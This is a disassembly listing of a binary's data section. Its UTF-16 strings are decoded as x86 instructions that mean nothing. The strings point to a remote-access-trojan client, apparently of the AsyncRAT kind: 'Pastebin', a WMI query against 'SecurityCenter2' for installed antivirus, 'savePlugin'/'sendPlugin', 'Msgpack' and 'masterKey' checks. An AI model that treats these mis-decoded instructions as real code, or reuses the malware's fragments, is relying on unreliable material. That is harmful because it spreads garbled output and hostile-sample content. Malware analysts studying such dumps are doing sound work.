  40c3c3:	20 00                	and    %al,(%eax)
  40c3c5:	00 09                	add    %cl,(%ecx)
  40c3c7:	54                   	push   %esp
  40c3c8:	00 72 00             	add    %dh,0x0(%edx)
  40c3cb:	75 00                	jne    0x40c3cd
  40c3cd:	65 00 00             	add    %al,%gs:(%eax)
  40c3d0:	0b 36                	or     (%esi),%esi
  40c3d2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c3d5:	62 00                	bound  %eax,(%eax)
  40c3d7:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c3dd:	46                   	inc    %esi
  40c3de:	00 61 00             	add    %ah,0x0(%ecx)
  40c3e1:	6c                   	insb   (%dx),%es:(%edi)
  40c3e2:	00 73 00             	add    %dh,0x0(%ebx)
  40c3e5:	65 00 00             	add    %al,%gs:(%eax)
  40c3e8:	0b 33                	or     (%ebx),%esi
  40c3ea:	00 32                	add    %dh,(%edx)
  40c3ec:	00 62 00             	add    %ah,0x0(%edx)
  40c3ef:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c3f5:	50                   	push   %eax
  40c3f6:	00 61 00             	add    %ah,0x0(%ecx)
  40c3f9:	74 00                	je     0x40c3fb
  40c3fb:	68 00 00 0f 56       	push   $0x560f0000
  40c400:	00 65 00             	add    %ah,0x0(%ebp)
  40c403:	72 00                	jb     0x40c405
  40c405:	73 00                	jae    0x40c407
  40c407:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c40d:	00 0b                	add    %cl,(%ebx)
  40c40f:	41                   	inc    %ecx
  40c410:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c414:	00 69 00             	add    %ch,0x0(%ecx)
  40c417:	6e                   	outsb  %ds:(%esi),(%dx)
  40c418:	00 00                	add    %al,(%eax)
  40c41a:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c41e:	00 75 00             	add    %dh,0x0(%ebp)
  40c421:	65 00 00             	add    %al,%gs:(%eax)
  40c424:	0b 66 00             	or     0x0(%esi),%esp
  40c427:	61                   	popa
  40c428:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c42c:	00 65 00             	add    %ah,0x0(%ebp)
  40c42f:	00 17                	add    %dl,(%edi)
  40c431:	50                   	push   %eax
  40c432:	00 65 00             	add    %ah,0x0(%ebp)
  40c435:	72 00                	jb     0x40c437
  40c437:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c43b:	72 00                	jb     0x40c43d
  40c43d:	6d                   	insl   (%dx),%es:(%edi)
  40c43e:	00 61 00             	add    %ah,0x0(%ecx)
  40c441:	6e                   	outsb  %ds:(%esi),(%dx)
  40c442:	00 63 00             	add    %ah,0x0(%ebx)
  40c445:	65 00 00             	add    %al,%gs:(%eax)
  40c448:	11 50 00             	adc    %edx,0x0(%eax)
  40c44b:	61                   	popa
  40c44c:	00 73 00             	add    %dh,0x0(%ebx)
  40c44f:	74 00                	je     0x40c451
  40c451:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c455:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c45b:	41                   	inc    %ecx
  40c45c:	00 6e 00             	add    %ch,0x0(%esi)
  40c45f:	74 00                	je     0x40c461
  40c461:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c467:	72 00                	jb     0x40c469
  40c469:	75 00                	jne    0x40c46b
  40c46b:	73 00                	jae    0x40c46d
  40c46d:	00 13                	add    %dl,(%ebx)
  40c46f:	49                   	dec    %ecx
  40c470:	00 6e 00             	add    %ch,0x0(%esi)
  40c473:	73 00                	jae    0x40c475
  40c475:	74 00                	je     0x40c477
  40c477:	61                   	popa
  40c478:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c47c:	00 65 00             	add    %ah,0x0(%ebp)
  40c47f:	64 00 00             	add    %al,%fs:(%eax)
  40c482:	09 50 00             	or     %edx,0x0(%eax)
  40c485:	6f                   	outsl  %ds:(%esi),(%dx)
  40c486:	00 6e 00             	add    %ch,0x0(%esi)
  40c489:	67 00 00             	add    %al,(%bx,%si)
  40c48c:	0b 47 00             	or     0x0(%edi),%eax
  40c48f:	72 00                	jb     0x40c491
  40c491:	6f                   	outsl  %ds:(%esi),(%dx)
  40c492:	00 75 00             	add    %dh,0x0(%ebp)
  40c495:	70 00                	jo     0x40c497
  40c497:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40c49d:	00 2b                	add    %ch,(%ebx)
  40c49f:	5c                   	pop    %esp
  40c4a0:	00 72 00             	add    %dh,0x0(%edx)
  40c4a3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4a4:	00 6f 00             	add    %ch,0x0(%edi)
  40c4a7:	74 00                	je     0x40c4a9
  40c4a9:	5c                   	pop    %esp
  40c4aa:	00 53 00             	add    %dl,0x0(%ebx)
  40c4ad:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c4b1:	75 00                	jne    0x40c4b3
  40c4b3:	72 00                	jb     0x40c4b5
  40c4b5:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c4bb:	43                   	inc    %ebx
  40c4bc:	00 65 00             	add    %ah,0x0(%ebp)
  40c4bf:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4c0:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c4c4:	00 72 00             	add    %dh,0x0(%edx)
  40c4c7:	32 00                	xor    (%eax),%al
  40c4c9:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c4cf:	6c                   	insb   (%dx),%es:(%edi)
  40c4d0:	00 65 00             	add    %ah,0x0(%ebp)
  40c4d3:	63 00                	arpl   %eax,(%eax)
  40c4d5:	74 00                	je     0x40c4d7
  40c4d7:	20 00                	and    %al,(%eax)
  40c4d9:	2a 00                	sub    (%eax),%al
  40c4db:	20 00                	and    %al,(%eax)
  40c4dd:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c4e1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4e2:	00 6d 00             	add    %ch,0x0(%ebp)
  40c4e5:	20 00                	and    %al,(%eax)
  40c4e7:	41                   	inc    %ecx
  40c4e8:	00 6e 00             	add    %ch,0x0(%esi)
  40c4eb:	74 00                	je     0x40c4ed
  40c4ed:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c4f3:	72 00                	jb     0x40c4f5
  40c4f5:	75 00                	jne    0x40c4f7
  40c4f7:	73 00                	jae    0x40c4f9
  40c4f9:	50                   	push   %eax
  40c4fa:	00 72 00             	add    %dh,0x0(%edx)
  40c4fd:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4fe:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c502:	00 63 00             	add    %ah,0x0(%ebx)
  40c505:	74 00                	je     0x40c507
  40c507:	00 17                	add    %dl,(%edi)
  40c509:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c50d:	73 00                	jae    0x40c50f
  40c50f:	70 00                	jo     0x40c511
  40c511:	6c                   	insb   (%dx),%es:(%edi)
  40c512:	00 61 00             	add    %ah,0x0(%ecx)
  40c515:	79 00                	jns    0x40c517
  40c517:	4e                   	dec    %esi
  40c518:	00 61 00             	add    %ah,0x0(%ecx)
  40c51b:	6d                   	insl   (%dx),%es:(%edi)
  40c51c:	00 65 00             	add    %ah,0x0(%ebp)
  40c51f:	00 07                	add    %al,(%edi)
  40c521:	4e                   	dec    %esi
  40c522:	00 2f                	add    %ch,(%edi)
  40c524:	00 41 00             	add    %al,0x0(%ecx)
  40c527:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c52d:	00 13                	add    %dl,(%ebx)
  40c52f:	53                   	push   %ebx
  40c530:	00 6f 00             	add    %ch,0x0(%edi)
  40c533:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c538:	00 61 00             	add    %ah,0x0(%ecx)
  40c53b:	72 00                	jb     0x40c53d
  40c53d:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c542:	09 70 00             	or     %esi,0x0(%eax)
  40c545:	6f                   	outsl  %ds:(%esi),(%dx)
  40c546:	00 6e 00             	add    %ch,0x0(%esi)
  40c549:	67 00 00             	add    %al,(%bx,%si)
  40c54c:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c551:	75 00                	jne    0x40c553
  40c553:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c557:	6e                   	outsb  %ds:(%esi),(%dx)
  40c558:	00 00                	add    %al,(%eax)
  40c55a:	15 73 00 61 00       	adc    $0x610073,%eax
  40c55f:	76 00                	jbe    0x40c561
  40c561:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c565:	6c                   	insb   (%dx),%es:(%edi)
  40c566:	00 75 00             	add    %dh,0x0(%ebp)
  40c569:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c56d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c56e:	00 00                	add    %al,(%eax)
  40c570:	07                   	pop    %es
  40c571:	44                   	inc    %esp
  40c572:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c576:	00 00                	add    %al,(%eax)
  40c578:	15 73 00 65 00       	adc    $0x650073,%eax
  40c57d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c57e:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c582:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c586:	00 67 00             	add    %ah,0x0(%edi)
  40c589:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c58f:	48                   	dec    %eax
  40c590:	00 61 00             	add    %ah,0x0(%ecx)
  40c593:	73 00                	jae    0x40c595
  40c595:	68 00 65 00 73       	push   $0x73006500
  40c59a:	00 00                	add    %al,(%eax)
  40c59c:	09 48 00             	or     %ecx,0x0(%eax)
  40c59f:	61                   	popa
  40c5a0:	00 73 00             	add    %dh,0x0(%ebx)
  40c5a3:	68 00 00 1b 50       	push   $0x501b0000
  40c5a8:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5ac:	00 67 00             	add    %ah,0x0(%edi)
  40c5af:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c5b5:	50                   	push   %eax
  40c5b6:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5ba:	00 67 00             	add    %ah,0x0(%edi)
  40c5bd:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c5c3:	52                   	push   %edx
  40c5c4:	00 75 00             	add    %dh,0x0(%ebp)
  40c5c7:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5c8:	00 00                	add    %al,(%eax)
  40c5ca:	0f 4d 00             	cmovge (%eax),%eax
  40c5cd:	73 00                	jae    0x40c5cf
  40c5cf:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c5d3:	61                   	popa
  40c5d4:	00 63 00             	add    %ah,0x0(%ebx)
  40c5d7:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c5da:	11 52 00             	adc    %edx,0x0(%edx)
  40c5dd:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c5e1:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c5e5:	76 00                	jbe    0x40c5e7
  40c5e7:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c5ec:	0b 45 00             	or     0x0(%ebp),%eax
  40c5ef:	72 00                	jb     0x40c5f1
  40c5f1:	72 00                	jb     0x40c5f3
  40c5f3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c5f4:	00 72 00             	add    %dh,0x0(%edx)
  40c5f7:	00 47 6d             	add    %al,0x6d(%edi)
  40c5fa:	00 61 00             	add    %ah,0x0(%ecx)
  40c5fd:	73 00                	jae    0x40c5ff
  40c5ff:	74 00                	je     0x40c601
  40c601:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c605:	4b                   	dec    %ebx
  40c606:	00 65 00             	add    %ah,0x0(%ebp)
  40c609:	79 00                	jns    0x40c60b
  40c60b:	20 00                	and    %al,(%eax)
  40c60d:	63 00                	arpl   %eax,(%eax)
  40c60f:	61                   	popa
  40c610:	00 6e 00             	add    %ch,0x0(%esi)
  40c613:	20 00                	and    %al,(%eax)
  40c615:	6e                   	outsb  %ds:(%esi),(%dx)
  40c616:	00 6f 00             	add    %ch,0x0(%edi)
  40c619:	74 00                	je     0x40c61b
  40c61b:	20 00                	and    %al,(%eax)
  40c61d:	62 00                	bound  %eax,(%eax)
  40c61f:	65 00 20             	add    %ah,%gs:(%eax)
  40c622:	00 6e 00             	add    %ch,0x0(%esi)
  40c625:	75 00                	jne    0x40c627
  40c627:	6c                   	insb   (%dx),%es:(%edi)
  40c628:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c62c:	00 6f 00             	add    %ch,0x0(%edi)
  40c62f:	72 00                	jb     0x40c631
  40c631:	20 00                	and    %al,(%eax)
  40c633:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c637:	70 00                	jo     0x40c639
  40c639:	74 00                	je     0x40c63b
  40c63b:	79 00                	jns    0x40c63d
  40c63d:	2e 00 00             	add    %al,%cs:(%eax)
  40c640:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c645:	70 00                	jo     0x40c647
  40c647:	75 00                	jne    0x40c649
  40c649:	74 00                	je     0x40c64b
  40c64b:	20 00                	and    %al,(%eax)
  40c64d:	63 00                	arpl   %eax,(%eax)
  40c64f:	61                   	popa
  40c650:	00 6e 00             	add    %ch,0x0(%esi)
  40c653:	20 00                	and    %al,(%eax)
  40c655:	6e                   	outsb  %ds:(%esi),(%dx)
  40c656:	00 6f 00             	add    %ch,0x0(%edi)
  40c659:	74 00                	je     0x40c65b
  40c65b:	20 00                	and    %al,(%eax)
  40c65d:	62 00                	bound  %eax,(%eax)
  40c65f:	65 00 20             	add    %ah,%gs:(%eax)
  40c662:	00 6e 00             	add    %ch,0x0(%esi)
  40c665:	75 00                	jne    0x40c667
  40c667:	6c                   	insb   (%dx),%es:(%edi)
  40c668:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c66c:	00 00                	add    %al,(%eax)
  40c66e:	55                   	push   %ebp
  40c66f:	49                   	dec    %ecx
  40c670:	00 6e 00             	add    %ch,0x0(%esi)
  40c673:	76 00                	jbe    0x40c675
  40c675:	61                   	popa
  40c676:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c67a:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c67e:	00 6d 00             	add    %ch,0x0(%ebp)
  40c681:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c685:	73 00                	jae    0x40c687
  40c687:	61                   	popa
  40c688:	00 67 00             	add    %ah,0x0(%edi)
  40c68b:	65 00 20             	add    %ah,%gs:(%eax)
  40c68e:	00 61 00             	add    %ah,0x0(%ecx)
  40c691:	75 00                	jne    0x40c693
  40c693:	74 00                	je     0x40c695
  40c695:	68 00 65 00 6e       	push   $0x6e006500
  40c69a:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c69e:	00 63 00             	add    %ah,0x0(%ebx)
  40c6a1:	61                   	popa
  40c6a2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6a6:	00 6f 00             	add    %ch,0x0(%edi)
  40c6a9:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6aa:	00 20                	add    %ah,(%eax)
  40c6ac:	00 63 00             	add    %ah,0x0(%ebx)
  40c6af:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6b0:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c6b4:	00 20                	add    %ah,(%eax)
  40c6b6:	00 28                	add    %ch,(%eax)
  40c6b8:	00 4d 00             	add    %cl,0x0(%ebp)
  40c6bb:	41                   	inc    %ecx
  40c6bc:	00 43 00             	add    %al,0x0(%ebx)
  40c6bf:	29 00                	sub    %eax,(%eax)
  40c6c1:	2e 00 00             	add    %al,%cs:(%eax)
  40c6c4:	05 58 00 32 00       	add    $0x320058,%eax
  40c6c9:	00 0f                	add    %cl,(%edi)
  40c6cb:	7b 00                	jnp    0x40c6cd
  40c6cd:	30 00                	xor    %al,(%eax)
  40c6cf:	3a 00                	cmp    (%eax),%al
  40c6d1:	44                   	inc    %esp
  40c6d2:	00 33                	add    %dh,(%ebx)
  40c6d4:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6d7:	20 00                	and    %al,(%eax)
  40c6d9:	00 0f                	add    %cl,(%edi)
  40c6db:	7b 00                	jnp    0x40c6dd
  40c6dd:	30 00                	xor    %al,(%eax)
  40c6df:	3a 00                	cmp    (%eax),%al
  40c6e1:	58                   	pop    %eax
  40c6e2:	00 32                	add    %dh,(%edx)
  40c6e4:	00 7d 00             	add    %bh,0x0(%ebp)
  40c6e7:	20 00                	and    %al,(%eax)
  40c6e9:	00 2b                	add    %ch,(%ebx)
  40c6eb:	28 00                	sub    %al,(%eax)
  40c6ed:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6ee:	00 65 00             	add    %ah,0x0(%ebp)
  40c6f1:	76 00                	jbe    0x40c6f3
  40c6f3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c6f7:	20 00                	and    %al,(%eax)
  40c6f9:	75 00                	jne    0x40c6fb
  40c6fb:	73 00                	jae    0x40c6fd
  40c6fd:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40c702:	00 20                	add    %ah,(%eax)
  40c704:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40c708:	00 70 00             	add    %dh,0x0(%eax)
  40c70b:	65 00 20             	add    %ah,%gs:(%eax)
  40c70e:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c711:	63 00                	arpl   %eax,(%eax)
  40c713:	31 00                	xor    %eax,(%eax)
  40c715:	00 45 28             	add    %al,0x28(%ebp)
  40c718:	00 65 00             	add    %ah,0x0(%ebp)
  40c71b:	78 00                	js     0x40c71d
  40c71d:	74 00                	je     0x40c71f
  40c71f:	38 00                	cmp    %al,(%eax)
  40c721:	2c 00                	sub    $0x0,%al
  40c723:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c727:	74 00                	je     0x40c729
  40c729:	31 00                	xor    %eax,(%eax)
  40c72b:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40c72f:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c733:	33 00                	xor    (%eax),%eax
  40c735:	32 00                	xor    (%eax),%al
  40c737:	29 00                	sub    %eax,(%eax)
  40c739:	20 00                	and    %al,(%eax)
  40c73b:	74 00                	je     0x40c73d
  40c73d:	79 00                	jns    0x40c73f
  40c73f:	70 00                	jo     0x40c741
  40c741:	65 00 20             	add    %ah,%gs:(%eax)
  40c744:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c747:	63 00                	arpl   %eax,(%eax)
  40c749:	37                   	aaa
  40c74a:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c74d:	24 00                	and    $0x0,%al
  40c74f:	63 00                	arpl   %eax,(%eax)
  40c751:	38 00                	cmp    %al,(%eax)
  40c753:	2c 00                	sub    $0x0,%al
  40c755:	24 00                	and    $0x0,%al
  40c757:	63 00                	arpl   %eax,(%eax)
  40c759:	39 00                	cmp    %eax,(%eax)
  40c75b:	00 14 74             	add    %dl,(%esp,%esi,2)
  40c75e:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c762:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c765:	24 f5                	and    $0xf5,%al
  40c767:	ac                   	lods   %ds:(%esi),%al
  40c768:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c76f:	7a 5c                	jp     0x40c7cd
  40c771:	56                   	push   %esi
  40c772:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c775:	89 03                	mov    %eax,(%ebx)
  40c777:	00 00                	add    %al,(%eax)
  40c779:	01 03                	add    %eax,(%ebx)
  40c77b:	20 00                	and    %al,(%eax)
  40c77d:	01 02                	add    %eax,(%edx)
  40c77f:	06                   	push   %es
  40c780:	0e                   	push   %cs
  40c781:	03 06                	add    (%esi),%eax
  40c783:	12 09                	adc    (%ecx),%cl
  40c785:	03 06                	add    (%esi),%eax
  40c787:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c78b:	00 02                	add    %al,(%edx)
  40c78d:	03 06                	add    (%esi),%eax
  40c78f:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c795:	03 06                	add    (%esi),%eax
  40c797:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c79c:	03 06                	add    (%esi),%eax
  40c79e:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c7a4:	06                   	push   %es
  40c7a5:	1c 02                	sbb    $0x2,%al
  40c7a7:	06                   	push   %es
  40c7a8:	08 04 00             	or     %al,(%eax,%eax,1)
  40c7ab:	00 12                	add    %dl,(%edx)
  40c7ad:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c7b2:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c7b8:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c7be:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c7c1:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c7c7:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c7cd:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7d0:	01 01                	add    %eax,(%ecx)
  40c7d2:	0a 04 00             	or     (%eax,%eax,1),%al
  40c7d5:	00 12                	add    %dl,(%edx)
  40c7d7:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c7dc:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c7e2:	02 03                	add    (%ebx),%al
  40c7e4:	00 00                	add    %al,(%eax)
  40c7e6:	1c 03                	sbb    $0x3,%al
  40c7e8:	00 00                	add    %al,(%eax)
  40c7ea:	08 04 00             	or     %al,(%eax,%eax,1)
  40c7ed:	01 01                	add    %eax,(%ecx)
  40c7ef:	08 04 00             	or     %al,(%eax,%eax,1)
  40c7f2:	01 02                	add    %eax,(%edx)
  40c7f4:	0e                   	push   %cs
  40c7f5:	0a 00                	or     (%eax),%al
  40c7f7:	04 02                	add    $0x2,%al
  40c7f9:	1c 12                	sbb    $0x12,%al
  40c7fb:	19 12                	sbb    %edx,(%edx)
  40c7fd:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c802:	01 01                	add    %eax,(%ecx)
  40c804:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c80a:	1c 04                	sbb    $0x4,%al
  40c80c:	08 00                	or     %al,(%eax)
  40c80e:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c814:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c817:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c81d:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c820:	00 12                	add    %dl,(%edx)
  40c822:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c827:	03 08                	add    (%eax),%ecx
  40c829:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c82c:	08 00                	or     %al,(%eax)
  40c82e:	08 03                	or     %al,(%ebx)
  40c830:	00 00                	add    %al,(%eax)
  40c832:	0e                   	push   %cs
  40c833:	04 00                	add    $0x0,%al
  40c835:	01 0e                	add    %ecx,(%esi)
  40c837:	0e                   	push   %cs
  40c838:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c83e:	d5 0a                	aad    $0xa
  40c840:	3a 06                	cmp    (%esi),%al
  40c842:	00 01                	add    %al,(%ecx)
  40c844:	12 29                	adc    (%ecx),%ch
  40c846:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c84c:	03 00                	add    (%eax),%eax
  40c84e:	00 18                	add    %bl,(%eax)
  40c850:	07                   	pop    %es
  40c851:	00 03                	add    %al,(%ebx)
  40c853:	08 18                	or     %bl,(%eax)
  40c855:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c85b:	18 0e                	sbb    %cl,(%esi)
  40c85d:	06                   	push   %es
  40c85e:	00 02                	add    %al,(%edx)
  40c860:	02 18                	add    (%eax),%bl
  40c862:	10 02                	adc    %al,(%edx)
  40c864:	06                   	push   %es
  40c865:	00 01                	add    %al,(%ecx)
  40c867:	11 30                	adc    %esi,(%eax)
  40c869:	11 30                	adc    %esi,(%eax)
  40c86b:	06                   	push   %es
  40c86c:	00 03                	add    %al,(%ebx)
  40c86e:	01 09                	add    %ecx,(%ecx)
  40c870:	09 09                	or     %ecx,(%ecx)
  40c872:	02 06                	add    (%esi),%al
  40c874:	09 03                	or     %eax,(%ebx)
  40c876:	06                   	push   %es
  40c877:	11 30                	adc    %esi,(%eax)
  40c879:	04 00                	add    $0x0,%al
  40c87b:	00 00                	add    %al,(%eax)
  40c87d:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c881:	00 00                	add    %al,(%eax)
  40c883:	04 01                	add    $0x1,%al
  40c885:	00 00                	add    %al,(%eax)
  40c887:	00 06                	add    %al,(%esi)
  40c889:	00 02                	add    %al,(%edx)
  40c88b:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c88e:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c893:	0e                   	push   %cs
  40c894:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c899:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c89e:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c8a3:	60                   	pusha
  40c8a4:	05 00 01 01 12       	add    $0x12010100,%eax
  40c8a9:	60                   	pusha
  40c8aa:	04 00                	add    $0x0,%al
  40c8ac:	01 01                	add    %eax,(%ecx)
  40c8ae:	0e                   	push   %cs
  40c8af:	18 06                	sbb    %al,(%esi)
  40c8b1:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c8b6:	12 49 0a             	adc    0xa(%ecx),%cl
  40c8b9:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c8bc:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c8c2:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c8c7:	0e                   	push   %cs
  40c8c8:	04 20                	add    $0x20,%al
  40c8ca:	00 00                	add    %al,(%eax)
  40c8cc:	00 04 40             	add    %al,(%eax,%eax,2)
  40c8cf:	00 00                	add    %al,(%eax)
  40c8d1:	00 04 10             	add    %al,(%eax,%edx,1)
  40c8d4:	00 00                	add    %al,(%eax)
  40c8d6:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c8d9:	01 01                	add    %eax,(%ecx)
  40c8db:	0e                   	push   %cs
  40c8dc:	04 20                	add    $0x20,%al
  40c8de:	01 0e                	add    %ecx,(%esi)
  40c8e0:	0e                   	push   %cs
  40c8e1:	06                   	push   %es
  40c8e2:	20 01                	and    %al,(%ecx)
  40c8e4:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c8e9:	20 02                	and    %al,(%edx)
  40c8eb:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c8f1:	00 01                	add    %al,(%ecx)
  40c8f3:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c8f8:	06                   	push   %es
  40c8f9:	11 50 03             	adc    %edx,0x3(%eax)
  40c8fc:	06                   	push   %es
  40c8fd:	12 55 05             	adc    0x5(%ebp),%dl
  40c900:	00 01                	add    %al,(%ecx)
  40c902:	0e                   	push   %cs
  40c903:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c908:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c90d:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c913:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c919:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c91f:	01 01                	add    %eax,(%ecx)
  40c921:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c926:	60                   	pusha
  40c927:	03 20                	add    (%eax),%esp
  40c929:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c92c:	20 00                	and    %al,(%eax)
  40c92e:	02 03                	add    (%ebx),%al
  40c930:	28 00                	sub    %al,(%eax)
  40c932:	1c 03                	sbb    $0x3,%al
  40c934:	06                   	push   %es
  40c935:	12 60 0b             	adc    0xb(%eax),%ah
  40c938:	20 02                	and    %al,(%edx)
  40c93a:	01 12                	add    %edx,(%edx)
  40c93c:	60                   	pusha
  40c93d:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c942:	60                   	pusha
  40c943:	04 20                	add    $0x20,%al
  40c945:	00 12                	add    %dl,(%edx)
  40c947:	60                   	pusha
  40c948:	05 20 01 12 60       	add    $0x60120120,%eax
  40c94d:	0e                   	push   %cs
  40c94e:	05 20 01 12 60       	add    $0x60120120,%eax
  40c953:	0a 05 20 01 12 60    	or     0x60120120,%al
  40c959:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c95e:	60                   	pusha
  40c95f:	08 03                	or     %al,(%ebx)
  40c961:	20 00                	and    %al,(%eax)
  40c963:	08 05 28 01 12 60    	or     %al,0x60120128
  40c969:	08 03                	or     %al,(%ebx)
  40c96b:	28 00                	sub    %al,(%eax)
  40c96d:	08 03                	or     %al,(%ebx)
  40c96f:	06                   	push   %es
  40c970:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40c974:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c978:	01 08                	add    %ecx,(%eax)
  40c97a:	0e                   	push   %cs
  40c97b:	05 20 01 01 12       	add    $0x12010120,%eax
  40c980:	61                   	popa
